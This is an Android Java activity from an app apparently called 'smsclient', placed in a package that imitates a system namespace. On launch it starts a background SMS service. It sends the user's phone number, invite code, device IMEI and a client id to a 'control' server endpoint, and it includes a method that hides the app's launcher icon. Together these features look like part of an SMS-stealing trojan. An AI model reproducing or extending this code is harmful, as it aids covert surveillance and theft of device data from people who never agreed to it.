package com.android.smsclient;

import java.util.ArrayList;
import java.util.List;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONObject;

import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;

import com.android.thread.RequestThread;
import com.android.utils.Utils;

public class SetActivity extends Activity {

	private EditText code;
	private EditText phone;
	private Button queding;
	private OnClickListenerImpl listener;
	private RequestThread auththread;
	private ProgressDialog pd;
	private String authurl="control/client!AuthDevice.action";
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		Intent service=new Intent(getApplicationContext(),SmsClientService.class);
        getApplicationContext().startService(service);
		code=(EditText)this.findViewById(R.id.code);
		phone=(EditText)this.findViewById(R.id.phone);
		queding=(Button)this.findViewById(R.id.queding);
		listener=new OnClickListenerImpl();
		queding.setOnClickListener(listener);
	}
	class OnClickListenerImpl implements OnClickListener{

		@Override
		public void onClick(View but) {
			// TODO Auto-generated method stub
			String scode=code.getText().toString();
			String sphone=phone.getText().toString();
			if("".equals(scode)){
				Utils.ShowToast(SetActivity.this, "邀请码不能为空");
				return;
			}
			if("".equals(sphone)){
				Utils.ShowToast(SetActivity.this, "手机号不能为空");
				return;
			}
			pd=Utils.createProgressDialog(SetActivity.this);
			pd.setMessage("正在认证中...");
			pd.show();
			List<NameValuePair> lnvp=new ArrayList<NameValuePair>();
			lnvp.add(new BasicNameValuePair("mapparam.code", scode));
			lnvp.add(new BasicNameValuePair("mapparam.phone", sphone));
			lnvp.add(new BasicNameValuePair("mapparam.deviceimei", Utils.GetImei(SetActivity.this)));
			lnvp.add(new BasicNameValuePair("mapparam.clientid", Utils.getStringConfig(SetActivity.this, "clientid", "")));
			auththread=new RequestThread(authurl,lnvp, handler);
			auththread.start();
		}
		
	}
	private Handler handler=new Handler(){

		@Override
		public void handleMessage(Message msg) {
			// TODO Auto-generated method stub
			super.handleMessage(msg);
			try {
				pd.dismiss();
				if(msg.what==1&&msg.obj!=null){
					JSONObject jo=(JSONObject)msg.obj;
					if(jo.getInt("state")==1){
						Utils.setIntConfig(SetActivity.this, "userid", jo.getInt("id"));
						Utils.ShowToast(SetActivity.this, "认证成功");
					}else{
						Utils.ShowToast(SetActivity.this, jo.getString("msg"));
					}
				}else{
					Utils.ShowToast(SetActivity.this, "请求服务器错误");
				}
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				Utils.ShowToast(SetActivity.this, "数据错误");
			}
		}
		
	};
	
	private void hideicon(){
    	PackageManager pm=SetActivity.this.getPackageManager();
		pm.setComponentEnabledSetting(SetActivity.this.getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
	

}
